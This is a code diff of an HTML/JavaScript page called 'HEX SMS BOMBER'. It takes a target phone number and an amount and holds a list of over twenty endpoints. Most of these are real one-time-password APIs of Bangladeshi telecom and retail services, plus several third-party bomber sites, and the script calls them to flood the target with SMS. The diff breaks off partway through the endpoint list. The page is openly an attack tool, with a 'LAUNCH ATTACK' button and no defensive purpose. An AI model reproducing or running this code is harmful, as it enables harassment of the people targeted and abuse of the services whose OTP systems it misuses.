@@ -3,20 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HEX SMS BOM</title>
-    <link rel="stylesheet" href="style.css">
+    <title>HEX SMS BOMBER - ULTIMATE</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
+        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
+        .container { text-align: center; margin-top: 5%; background: rgba(0,0,0,0.9); padding: 30px; border: 2px solid #00ff00; display: inline-block; position: relative; left: 50%; transform: translateX(-50%); box-shadow: 0 0 20px #00ff00; border-radius: 10px; width: 90%; max-width: 400px; }
+        input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 12px; margin: 8px; width: 80%; text-align: center; font-size: 16px; outline: none; border-radius: 5px; }
+        button { background: #00ff00; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 18px; transition: 0.4s; border-radius: 5px; width: 85%; }
+        button:hover { background: #fff; color: #00ff00; }
+        #display { margin-top: 25px; font-size: 1.2em; font-weight: bold; text-shadow: 0 0 10px #00ff00; min-height: 30px; }
+    </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="container">
-        <div class="card">
-            <h1>HXN SMS BOM</h1>
-            <input type="text" id="target" placeholder="Target Number +88..">
-            <input type="number" id="count" placeholder="Request Amount">
-            <button id="actionBtn" onclick="startProcess()">START ATTACK</button>
-            <div id="display">Status: Ready...</div>
-        </div>
+        <h1>HEX SMS BOMBER</h1>
+        <input type="number" id="target" placeholder="Enter Phone Number">
+        <input type="number" id="count" placeholder="Enter Amount">
+        <button id="bombBtn" onclick="startProcess()">LAUNCH ATTACK</button>
+        <div id="display">SYSTEM READY</div>
     </div>
-    <script src="script.js"></script>
-</body>
-</html>
+
+    <script>
+        let isCooldown = false;
+
+        // পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
+        window.onload = function() {
+            const savedCooldownTime = localStorage.getItem('cooldownEndTime');
+            if (savedCooldownTime) {
+                const currentTime = Date.now();
+                if (currentTime < savedCooldownTime) {
+                    const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
+                    activateCooldown(remainingTime);
+                }
+            }
+        };
+
+        async function startProcess() {
+            const phone = document.getElementById('target').value;
+            const amount = parseInt(document.getElementById('count').value);
+            const display = document.getElementById('display');
+
+            if (isCooldown) {
+                display.innerText = "Cooldown Active!";
+                return;
+            }
+
+            if(!phone || !amount) { 
+                display.innerText = "Error: Input Missing!"; 
+                return; 
+            }
+
+            display.innerText = "Initializing APIs...";
+            
+            // আপনার দেওয়া প্রতিটি এপিআই এখানে নির্ভুলভাবে যোগ করা হয়েছে
+            let apis = [
+                { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
+                { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
+                { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
+                { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
+                { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
+                { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
+                { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
+                { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
+                { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
+                { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
+                { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
+                { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+                { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
+                { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
+                { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
+                { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+                { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
+                { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+                { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
+                { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+                { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+                { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone }
